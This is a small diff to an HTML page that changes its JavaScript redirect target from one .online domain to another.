@@ -9,7 +9,7 @@
 </head>
 <body>
 	<script>
-		window.location.replace('https://southmonumentplc.online');
+		window.location.replace('https://urbanville.online');
 	</script>
 </body>
 </html>
